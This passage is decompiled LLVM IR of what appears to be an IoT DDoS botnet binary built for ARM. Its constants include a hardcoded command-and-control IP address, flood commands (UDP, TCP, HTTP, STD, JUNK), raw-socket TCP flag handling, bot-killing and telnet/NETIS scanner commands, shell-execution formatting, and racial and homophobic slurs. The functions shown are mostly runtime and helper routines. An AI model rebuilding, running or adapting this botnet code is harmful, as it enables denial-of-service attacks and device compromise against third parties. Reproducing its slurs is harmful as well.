x i8]* @global_var_23330.1081, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_23378.1082, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_233d0.1083, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_2343c.1084, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_23494.1085, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_234e4.1086, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_23508.1087, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_23564.1088, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_23574.1089, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_235a4.1090, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_235c8.1091, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_235ec.1092, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_23608.1093, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_23648.1094, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_236d4.1095, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_2371c.1096, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_23764.1097, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_237ac.1098, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_237f4.1099, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_23848.1100, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_23898.1101, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_23904.1102, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23958.1103, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_239b4.1104, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_23a10.1105, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23a74.1106, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23ad0.1107, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23b2c.1108, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_23b88.1109, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_23be8.1110, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_23c30.1111, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_23cc8.1112, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_23d14.1113, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_23d60.1114, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_23db0.1115, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_23df8.1116, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_23e4c.1117, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_23e9c.1118, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_23ee4.1119, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_23f30.1120, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_23f7c.1121, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_23fc4.1122, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_24014.1123, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_24064.1124, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_24098.1125, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_240cc.1126, i32 0, i32 0)]
@global_var_22d8c.1129 = constant [6 x i8] c"close\00"
@global_var_22d94.1130 = constant [11 x i8] c"keep-alive\00"
@global_var_22da0.1131 = constant [7 x i8] c"accept\00"
@global_var_22da8.1132 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22d8c.1129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22d94.1130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_22da0.1131, i32 0, i32 0)]
@global_var_2420c.1137 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_2424c.1139 = constant [6 x i8] c"arfgG\00"
@global_var_24254.1140 = constant [9 x i8] c"HBiug655\00"
@global_var_24260.1141 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_24270.1142 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_24284.1143 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_24298.1144 = constant [12 x i8] c"GJjyur67458\00"
@global_var_242a4.1145 = constant [12 x i8] c"RYSDk747586\00"
@global_var_242b0.1146 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_242bc.1147 = constant [10 x i8] c"KHGK7985i\00"
@global_var_242c8.1148 = constant [11 x i8] c"yuituiILYF\00"
@global_var_242d4.1149 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_242e4.1150 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_242f0.1151 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_24300.1152 = constant [9 x i8] c"ewqdcftr\00"
@global_var_2430c.1153 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_2431c.1154 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_24328.1155 = constant [12 x i8] c"twehgbferhb\00"
@global_var_24334.1156 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_24340.1157 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_24350.1158 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_24360.1159 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_24370.1160 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_2437c.1161 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_2438c.1162 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_2439c.1163 = constant [12 x i8] c"yteytietyue\00"
@global_var_243a8.1164 = constant [9 x i8] c"qsortEQS\00"
@global_var_243b4.1165 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_243c4.1166 = constant [4 x i8] c"std\00"
@global_var_243c8.1167 = constant [4 x i8] c"dts\00"
@global_var_243cc.1168 = constant [6 x i8] c"hackz\00"
@global_var_243d4.1169 = constant [7 x i8] c"shdyed\00"
@global_var_243dc.1170 = constant [5 x i8] c"http\00"
@global_var_243e4.1171 = constant [10 x i8] c"sghwiondc\00"
@global_var_243f0.1172 = constant [7 x i8] c"nigger\00"
@global_var_243f8.1173 = constant [6 x i8] c"pussy\00"
@global_var_24400.1174 = constant [7 x i8] c"faggot\00"
@global_var_24408.1175 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2424c.1139, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_24254.1140, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24260.1141, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_24270.1142, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_24284.1143, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24298.1144, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_242a4.1145, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_242b0.1146, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_242bc.1147, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_242c8.1148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_242d4.1149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_242e4.1150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_242f0.1151, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_24300.1152, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_2430c.1153, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2431c.1154, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24328.1155, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24334.1156, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24340.1157, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24350.1158, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24360.1159, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_24370.1160, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2437c.1161, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2438c.1162, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2439c.1163, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_243a8.1164, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_243b4.1165, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_243c4.1166, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_243c8.1167, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_243cc.1168, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_243d4.1169, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_243dc.1170, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_243e4.1171, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_243f0.1172, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_243f8.1173, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_24400.1174, i32 0, i32 0)]
@global_var_24498.1179 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_244b4.1181 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_244d8.1186 = constant [4 x i8] c"all\00"
@global_var_244dc.1188 = constant i32 44
@global_var_244e0.1190 = constant [4 x i8] c"syn\00"
@global_var_244e4.1192 = constant [4 x i8] c"rst\00"
@global_var_244e8.1194 = constant [4 x i8] c"fin\00"
@global_var_244ec.1196 = constant [4 x i8] c"ack\00"
@global_var_244f0.1198 = constant [4 x i8] c"psh\00"
@global_var_244f4.1200 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_24508.1204 = constant [6 x i8] c"PONG!\00"
@global_var_24510.1206 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_2451c.1209 = constant [10 x i8] c"My IP: %s\00"
@global_var_24528.1211 = constant [8 x i8] c"BOTKILL\00"
@global_var_24530.1213 = constant [13 x i8] c"Killing Bots\00"
@global_var_24540.1215 = constant [7 x i8] c"LOOPME\00"
@global_var_24548.1217 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_24558.1219 = constant [7 x i8] c"TELNET\00"
@global_var_24560.1221 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_24570.1223 = constant [4 x i8] c"OFF\00"
@global_var_34744.1225 = global i32 0
@global_var_24574.1227 = constant [5 x i8] c" OFF\00"
@global_var_2457c.1229 = constant [3 x i8] c"ON\00"
@global_var_24580.1231 = constant [6 x i8] c"NETIS\00"
@global_var_24588.1233 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_245a4.1235 = constant [5 x i8] c"HOLD\00"
@global_var_245ac.1238 = constant [5 x i8] c"JUNK\00"
@global_var_245b4.1240 = constant [4 x i8] c"UDP\00"
@global_var_245b8.1242 = constant [5 x i8] c"HTTP\00"
@global_var_245c0.1244 = constant [4 x i8] c"CNC\00"
@global_var_245c4.1246 = constant [6 x i8] c"COMBO\00"
@global_var_245cc.1248 = constant [4 x i8] c"STD\00"
@global_var_245d0.1250 = constant [4 x i8] c"TCP\00"
@global_var_245d4.1252 = constant [5 x i8] c"STOP\00"
@global_var_245dc.1256 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_2e1e0.1259 = local_unnamed_addr global i32 -1
@global_var_1f7b8.1261 = constant [15 x i8] c"191.96.249.102\00"
@global_var_2e0ac.1262 = global [15 x i8]* @global_var_1f7b8.1261
@global_var_2e0b0.1264 = local_unnamed_addr global i32 987
@global_var_245e8.1266 = constant [8 x i8] c"8.8.8.8\00"
@global_var_245f0.1269 = constant [16 x i8] c"/proc/net/route\00"
@global_var_24600.1271 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2e4f0.1273 = global i32 0
@global_var_2460c.1275 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_2461c.1277 = constant [7 x i8] c"SERVER\00"
@global_var_24624.1279 = constant [7 x i8] c"ROUTER\00"
@global_var_2462c.1281 = constant i32 0
@global_var_24630.1284 = constant [5 x i8] c"sshd\00"
@global_var_24638.1286 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_2e1dc.1288 = global i32 1
@global_var_2464c.1291 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_2465c.1293 = constant i32 47
@global_var_246dc.1296 = constant [9 x i8] c"VOIDV1.0\00"
@global_var_24660.1298 = constant i32 993090331
@global_var_246e8.1303 = constant [5 x i8] c"PONG\00"
@global_var_246f0.1305 = constant [4 x i8] c"DUP\00"
@global_var_246f4.1307 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_24700.1311 = constant i32 32
@global_var_2e024.1314 = global i32 0
@global_var_14704.1328 = constant i32 -382910448
@global_var_19b4c.1329 = constant i32 -382909968
@global_var_19f08.1335 = constant i32 -382910224
@global_var_1599c.1361 = constant i32 -456978431
@global_var_16750.1405 = constant i32 -478871519
@global_var_170c4.1414 = constant i32 -382906384
@global_var_14324.1423 = constant i32 -509591552
@global_var_17684.1429 = constant i32 -442564540
@global_var_17f2c.1471 = constant i32 -494075872
@global_var_14350.1472 = constant i32 -382910336
@global_var_180ec.1484 = constant i32 -369098421
@global_var_174f4.1503 = constant i32 -442543860
@global_var_15734.1509 = constant i32 -905969619
@global_var_15a50.1513 = constant i32 -369093142
@global_var_18b64.1526 = constant i32 -335545171
@global_var_190f8.1544 = constant i32 -443088884
@global_var_17278.1556 = constant i32 -382909968
@global_var_1ae24.1563 = constant i32 -382906384
@global_var_20003.1572 = constant [7 x i8] c".%d.%d\00"
@global_var_20000.1573 = constant [10 x i8] c"165.%d.%d\00"
@global_var_19ea8.1583 = constant i32 -509607926
@global_var_1ac48.1601 = constant i32 -509607928
@global_var_1c10c.1646 = constant i32 -478805983
@global_var_1c698.1654 = constant i32 -382909456
@global_var_14388.1677 = constant i32 -382910336
@global_var_1db3c.1682 = constant i32 -442695584
@global_var_1e104.1691 = constant i32 -382910224
@global_var_1efc0.1719 = constant i32 -504313148
@global_var_1efa8.1720 = constant i32 -483131392
@global_var_1ee54.1721 = constant i32 -481229311
@global_var_1f030.1722 = constant i32 -477817729
@global_var_1f130.1723 = constant i32 -476034303
@global_var_1f36c.1724 = constant i32 -516685812
@global_var_1f260.1725 = constant i32 -905969571
@global_var_1f194.1726 = constant i32 -528203771
@global_var_1f3f4.1727 = constant i32 -478079873
@global_var_1f3d8.1728 = constant i32 -534704125
@global_var_1f388.1729 = constant i32 -534704125
@global_var_1f320.1730 = constant i32 -483131392
@global_var_2e4c0.3 = external global i8*
@global_var_2e4f6.66 = external global i8*
@global_var_2e4f7.67 = local_unnamed_addr global i8 0
@global_var_2e4f8.68 = local_unnamed_addr global i8 0
@global_var_2e4f9.69 = local_unnamed_addr global i8 0
@global_var_2e4fa.70 = local_unnamed_addr global i8 0
@global_var_246fc.1309 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2e4c0.3 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_2e4c0.3 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2e4c0.3, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_2e00c.13, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_2e00c.13 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2e00c.13, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_13254.17 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 128932, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_2e4fc.20, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_2e500.21, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_2e504.22, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2e4fc.20 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_2e4fc.20 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_2e4fc.20 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_2e1e8.25, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_2e1e8.25, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_2e4fc.20 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_2e1e4.28, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_2e4fc.20 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_2e4fc.20, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2e4fc.20 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c10 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c10, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.011, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.011 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.011, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
